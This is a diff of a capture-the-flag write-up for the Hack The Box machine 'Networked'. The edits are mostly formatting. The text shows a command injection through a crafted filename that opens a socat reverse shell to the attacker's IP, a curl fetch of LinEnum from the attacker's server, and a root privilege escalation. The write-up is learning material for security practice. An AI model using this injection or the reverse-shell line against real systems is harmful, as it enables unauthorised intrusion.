@@ -322,14 +322,14 @@ ls -al user.txt
 -r--------. 1 guly guly 33 Oct 30  2018 user.txt
 ```
 
-But there are those two other files, **check_attack.php** and **crontab.guly**. Lets check those out:
+But there are those two other files, `check_attack.php` and `crontab.guly`. Lets check those out:
 
 ```console
 cat crontab.guly
 */3 * * * * php /home/guly/check_attack.php
 ```
 
-So that means every 3 minutes **check_attack.php** should run, and look at the script itself:
+So that means every 3 minutes `check_attack.php` should run, and look at the script itself:
 
 ```php
 <?php
@@ -368,7 +368,7 @@ foreach ($files as $key => $value) {
 
 ?>
 ```
-So how can we leverage this to execute a command? That is a great question. I really struggled understanding how this code was improperly written so I called in some backup - a close friend of mine who is much better at this than I am helped me understand. There was also a lib.php that I had not really looked at, but the above php references a few functions that are located in the lib.php file:
+So how can we leverage this to execute a command? That is a great question. I really struggled understanding how this code was poorly written so I called in some backup - a close friend of mine who is much better at this than I am helped me understand. There was also a `lib.php` that I had not really looked at, but the above php references a few functions that are located in the `lib.php` file:
 
 ```php
 function getnameCheck($filename) {
@@ -405,7 +405,7 @@ The intended flow is that if the file is not named with a valid IP address as a 
 touch "invalidfile.txt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.75:4444"
 ```
 
-it actually gets executed as exec("nohup /bin/rm -f $path;invalidfile.txt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.75:4444 > /dev/null 2>&1 &");
+it actually gets executed as `exec("nohup /bin/rm -f $path;invalidfile.txt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.75:4444 > /dev/null 2>&1 &");`
 
 and we get a shell, and the user flag:
 
@@ -421,7 +421,7 @@ check_attack.php  crontab.guly	user.txt
 
 ## Root Flag
 
-So this is a linux box, time to get linenum, the script I prefer to poke around after inital access, over to this machine. There was no wget or git on the target, so curl and adding it to a file worked just as well. We also want to give it permissions to run and then execute it:
+So this is a linux box, time to get [linenum](https://github.com/rebootuser/LinEnum), the script that I prefer to poke around after initial access, over to this machine. There was no wget or git on the target, so curl and adding it to a file worked just as well. We also want to give it permissions to run and then execute it:
 
 ```console
 [guly@networked ~]$ curl http://10.10.14.75:8000/LinEnum.sh > LinEnum.sh
@@ -496,7 +496,7 @@ BROWSER_ONLY=TTTTTTTTTTTTTTT
 BOOTPROTO=RRRRRRRRRRRRRRR
 ```
 
-We seem to be limited to the **a-z, A-Z, 0-9, _, /, \, -** characters. I think we should be able to invoke a root-level shell with this. I tried a few different inputs for a couple minutes to see what, if anything changed depending on the inputs. I picked ```/bin/bash -i``` as the command I wanted to use to invoke the root-level shell. Taking a page from the initial access portion, and how I struggled with the php there - I wrote out the pseudocode of the changename.sh script and did not take for granted any of the characters I was given. 
+We seem to be limited to the `a-z, A-Z, 0-9, _, /, \, -` characters. I think we should be able to invoke a root-level shell with this. I tried a few different inputs for a couple minutes to see what, if anything changed depending on the inputs. I picked ```/bin/bash -i``` as the command I wanted to use to invoke the root-level shell. Taking a page from the initial access portion, and how I struggled with the php there - I wrote out the pseudocode of the changename.sh script and did not take for granted any of the characters I was given. 
 
 In the manpage for backslash it states:
 
@@ -525,7 +525,3 @@ uid=0(root) gid=0(root) groups=0(root)
 
 # Conclusion
 This was by far the most difficult box for me so far. It really exposed my weakness when it comes to understanding php. I was pretty happy with how the amendments I made to my process from struggling so hard initially really paid off in how quickly I was able to privesc (even though there wasn't any php involved).
-
-# References
-1. https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d
-
